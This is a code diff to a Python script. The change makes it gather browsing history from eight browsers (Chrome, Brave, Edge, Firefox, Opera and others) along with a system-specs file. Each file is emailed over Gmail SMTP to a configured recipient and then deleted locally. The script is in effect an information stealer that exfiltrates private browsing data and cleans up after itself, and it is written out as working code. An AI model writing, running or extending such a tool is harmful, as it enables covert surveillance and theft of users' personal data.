@@ -14,6 +14,7 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
+from browser_history.browsers import Chrome, Brave, Chromium, Edge, Firefox, Opera, OperaGX, Vivaldi
 
 print("*"*20)
 
@@ -124,22 +125,22 @@ print("done")
 
 ### Browsers history file ###
 
-outputs = get_history()
-outputs.save("history.csv")
+browsers = ["Brave", "Chrome", "Chromium", "Edge", "Firefox", "Opera", "OperaGX", "Vivaldi"]
 
+browser_files = []
+
+for browser_name in browsers:
+    try:
+        browser_class = globals()[browser_name]
+        browser_instance = browser_class()
+        outputs = browser_instance.fetch_history()
+        csv_filename = f"{browser_name}_history.csv"
+        outputs.save(csv_filename)
+        print(f"History for {browser_name} saved to {csv_filename}")
+        browser_files.append(csv_filename)
+    except Exception as e:
+        print(f"Error fetching history for {browser_name}: {e}")
 print("done")
-
-current_folder = os.getcwd()
-print("Current folder path:", current_folder)
-
-specs_file = "specs.txt"
-
-specs_path = os.path.abspath(specs_file)
-
-if os.path.isfile(specs_path):
-    print(f"The file '{specs_file}' exists at path: {specs_path}")
-else:
-    print(f"The file '{specs_file}' does not exist in the current folder.")
 
 def delete_file(file_path):
     try:
@@ -180,8 +181,8 @@ def send_email(sender_email, sender_password, recipient_email, subject, body, at
 sender_email = 'your_email@gmail.com'
 sender_password = 'your gmail app password'
 recipient_email = 'your recipient email'
-subject = 'email subject'
-body = 'email content.'
+subject = 'Temat wiadomości'
+body = 'Treść wiadomości.'
 
 def generate_paths():
     unix_time = time.time()
@@ -191,24 +192,27 @@ def generate_paths():
     specs_destination_path = str(unix_time) + "_specs.txt"
     specs_path = os.path.abspath(specs_file)
 
-    history_file = "history.csv"
-    history_destination_path = str(unix_time) + "_history.csv"
-    history_path = os.path.abspath(history_file)
-
+    for history_file in browser_files:
+        history_destination_path = str(unix_time) + "_" + history_file
+        history_path = os.path.abspath(history_file)
+        paths.append([history_path, history_destination_path])
+    
     paths.append([specs_path, specs_destination_path])
-    paths.append([history_path, history_destination_path])
 
     return paths
 
 print(generate_paths())
 paths = generate_paths()
 
+
+
 for i, path in enumerate(paths):
-    print("Uploading file:", i+1, path[0], path[1])
-    send_email(sender_email, sender_password, recipient_email, subject, body, path[0], path[1])
-    print("done")
-    print("Deleting file::", i+1, path[0], path[1])
+    with open(path[0], 'r') as file:
+        lines = file.readlines()
+        if len(lines) >= 3:
+            print("Uploading file:", i+1, path[0], path[1])
+            send_email(sender_email, sender_password, recipient_email, subject, body, path[0], path[1])
+    print("Deleting file:", i+1, path[0], path[1])
     delete_file(path[0])
-    print("done")
 
 
